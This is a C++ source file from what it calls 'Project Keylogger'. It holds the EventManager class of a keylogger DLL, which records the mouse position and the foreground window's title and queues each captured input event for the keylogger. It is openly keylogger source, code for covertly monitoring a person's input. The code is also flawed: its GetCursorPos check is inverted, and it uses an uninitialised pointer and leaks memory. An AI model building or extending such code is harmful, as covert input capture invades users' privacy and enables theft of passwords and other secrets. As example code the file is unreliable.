/**
 * Project Keylogger
 */
#include				"keylogger_dll/EventManager.h"
#include				"keylogger_dll\Keylogger.h"

/**
 * @param Keylogger&
 */
EventManager::EventManager(Keylogger& keylogger) : _keylogger(keylogger) {

	_context = (struct s_Context*)malloc(sizeof(t_Context));
}

EventManager::~EventManager()
{
}

/**
 * Call the Event Factory to create an event depending on parameters. 
 * @param LPARAM
 * @param WPARAM
 * @return void
 */
void					EventManager::handleEvent(const WPARAM wParam, const LPARAM lParam) const{
	int					length;
	HWND				window;
	if (GetCursorPos(_context->_mousePos))
	{
		std::cout << "GetCursorPos error !" << std::endl;
	}
	if ((window = GetForegroundWindow()) == NULL)
	{
		std::cout << "GetActiveWindow error !" << std::endl;
	}
	if ((length = GetWindowTextLength(window) + 1) == 1)
	{
		std::cout << "GetWindowTextLength error !" << std::endl;
	}
	char *str;
	str = (char*)malloc(length);
	if (GetWindowText(window, str, length) == 0)
	{
		std::cout << "GetWindowText error !" << std::endl;
	}
	const AEvent* event = EventFactory::create(wParam, lParam, *_context);
	_keylogger.pushToQueue(event);
	std::cout << "Event from : " << str << std::endl;
	std::cout << "Event pushed." << std::endl;
    return;
}